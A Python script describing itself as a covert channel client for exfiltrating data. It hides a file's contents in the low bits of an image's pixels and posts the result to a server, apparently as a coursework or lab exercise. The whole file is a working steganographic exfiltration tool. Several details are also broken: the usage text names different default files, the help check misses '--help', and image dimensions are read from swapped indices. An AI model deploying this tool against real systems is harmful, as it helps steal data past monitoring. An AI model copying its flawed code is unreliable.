#!/usr/bin/python3
"""@package CovertClient covert channel to exfiltrate data
"""

import sys
import cv2
from scapy.all import *
from bitarray import *
from bitstring import BitArray, BitStream
import numpy as np
import requests

default_path_to_image = "image.png"
default_path_to_data = "data.txt"
default_path_to_write_image = "hidden.png"
default_path_to_write_data = "extracted.txt"

def print_usage():
    """!@brief Print usage information if user 
        provides help arguments or provides too many arguments
    """
    print("This script hides a file's data inside an image.")
    print("Two options to run script:")
    print("    python3 covert.py")
    print("    ./covert.py")
    print("The script hides data from secret.txt in the hello.jpg image by default")
    print("    Both default files must reside in same directory as covert.py")
    print("The first argument defines a custom image")
    print("    ./covert.py image.jpg")
    print("The second argument defines a custom data file")
    print("    ./covert.py image.jpg data.txt")
    print("A custom image name must be provided whenever a custom data file name is provided")


def check_args():
    """!@brief Parse command line arguments.
    Print usage information and exit if user inputs help arguments or inputs too many arguments.
    Declare path_to_image and path_to_data variables based on provided arguments.
    """
    # Print usage information if user input -h or --help as an argument
    if ("-h" or"--help") in sys.argv:
        print_usage()
        sys.exit()

    # User provides no custom names, use default image and data file paths
    if len(sys.argv) == 1:
        return default_path_to_image, default_path_to_data

    # User only provides custom image name
    elif len(sys.argv) == 2:
        return sys.argv[1], default_path_to_data
    
    # User provides custom image and data file name
    elif len(sys.argv) == 3:
        return sys.argv[1], sys.argv[2]
    
    # Print usage information if user provides too many arguments
    elif len(sys.argv) > 3:
        print(" - Too many arguments provided. See usage information below. -")
        print()
        print_usage()
        sys.exit()


def check_image_validity(path_to_image):
    """!@brief Check if the image exists and can be read from
    @param path_to_image Relative path to image to check
    @return 2D numpy array representation of every pixel in image
    """
    # Check if image exists
    # Exit if script cannot read image
    image = cv2.imread(path_to_image, 1)
    if image is None:
        print("Failed to read image.")
        sys.exit()
    return image

def check_file_exists_to_read(path_to_data):
    """!@brief Check if a file exists on the disk and can be opened.
        On error, print error message and exit.
    @param path_to_data Relative path to data file to check
    @return file descriptor to file at path_to_data
    """
    try:
        return open(path_to_data, mode='rb')
    except Exception as e:
        print("Failed to read data from file: ", e)
        sys.exit()


def check_data_validity(path_to_data):
    """!@brief Check if the data file exists and can be read from
    @param path_to_data Relative path to data file to check 
    @return bitarray of data file
    """
    fd = check_file_exists_to_read(path_to_data)

    # Exit if script reads no data from data file
    file_data = fd.read()
    if len(file_data) <= 0:
        fd.close()
        print("Opened file but failed to read any data.")
        sys.exit()
    fd.close()

    # Convert data file data to array of bits
    file_bits = BitArray(file_data)
    if file_bits == None:
        print("Failed to read data file into bitarray.")
        sys.exit()
    return file_bits


def check_size_validity(image, file_bits):
    """!@brief Checks if image contains enough least significant bits to store data from file
    @param image Image object to check
    @param file_bits BitArray of file data to check
    """
    # Check im image is large enough to hide data file in
    img_width = image.shape[0]
    img_height = image.shape[1]
    # Each pixel has three colors components with 2 least significant bits we modify
    bits_available = img_width * img_height * 3 * 2
    # Make sure file can hold up to all bits of the file plus the 26 bit file size header we add
    if bits_available < (len(file_bits) + 26):
        print("Image not big enough to hide payload inside.")
        sys.exit()


def check_validity_and_read(path_to_image, path_to_data):
    """!@brief Check if the image and data files exist and can be read from. Reads data into
        objects if possible and returns them.
    @param path_to_image Relative path to image to check and read
    @param path_to_data Relative path to data file to check and read
    @return Image object created from image at path_to_image
    @return BitArray read in from data file at path_to_file
    """
    # Check if image exists and can be read from
    # Returns 2D numpy array representing each pixel of the image
    image = check_image_validity(path_to_image)

    # Check if file exists and can be read from
    # Returns bitarray of data from file
    file_bits = check_data_validity(path_to_data)

    # Check if image is large enough to hide data file in
    check_size_validity(image, file_bits)

    return image, file_bits


def store_data_in_image(image, file_data):
    """!@brief Stores file data into the two least significat bits of the three color
        components (Red, Green, Blue) of the pixels in an image. The image is modified in
        place, and any pixels beyond the amount required to store the file data are unmodified.
    @param image Image object to hide data file in
    @param file_data Data from data file to hide in image
    """
    # Prepend file data with 26 bits representing an unsigned int of the size of the file data
    # We require a minimum of 26 bits to store the max payload storable in a 4K resolution image
    # [4K Resolution/Number of Pixels] 3840 * 2160 * [Number of Color Components] * 3 * [Bits
    # Available Per Color Component] 2 = 49,766,400. Log_base2(49,766,400) ~= 25.56, 26 bits needed
    data_size = len(file_data.bin)
    data_size_bits = BitArray(uint=data_size, length=26)
    file_data.insert(data_size_bits, 0)

    # Store file data in least significant bits of all three color components within each pixel
    done_copying = False
    """
    Iterates through each row of image array, then through each pixel of the row, then
    through all three color components (Red, Green, Blue) of the pixel. Replaces the two
    least significant bits of the color component with the next two bits from the data
    bitarray until it stores the entire data bitarray. 
    """
    for i in range(image.shape[1]):
        for j in range(len(image[i])):
            temp_pixel= np.zeros(3)
            done_hiding = False
            for k in range(len(image[i][j])):
                color_component = image[i][j][k]
                color_bits = BitArray(uint=color_component, length=8)
                # Copies original color component data if it finishes hiding all of
                # the file data before reaching the last color component of a pixel
                if len(file_data) > 0:
                    data_bits = file_data[:2]
                    data_bits.prepend('0b000000')
                    file_data = file_data[2:]
                else:
                    data_bits = color_bits[-2:]
                    data_bits.prepend('0b000000')
                    done_hiding = True
                data_color_bits = ((color_bits & BitArray('0b11111100')) | data_bits)
                temp_pixel[k] = int(data_color_bits.int)
            image[i][j] = temp_pixel.astype(int)
            if done_hiding:
                break
        if done_hiding:
            break
    cv2.imwrite(default_path_to_write_image, image, [cv2.IMWRITE_PNG_COMPRESSION, 0])


def send_image():
    url = 'http://127.0.0.1:5000'
    bits = check_data_validity("hidden.png")
    files = {'file': open("hidden.png", "rb")}
    r= requests.post(url, files=files)
    print(r.text)


def main():
    """!@main calls all helper functions
    """
    # Parse arguments that user submitted through command line
    # Returns the paths to the image and data files to use
    path_to_image, path_to_data = check_args()
 
    # Check if image and data files exist and can be read from
    # Returns a 2D numpy array representing the image and a bitarray of the data file
    image, file_bits = check_validity_and_read(path_to_image, path_to_data)

    # Hide file data in image file
    store_data_in_image(image, file_bits)
    
    print("File data hidden in image!")

    send_image()

if __name__ == "__main__":
    main()
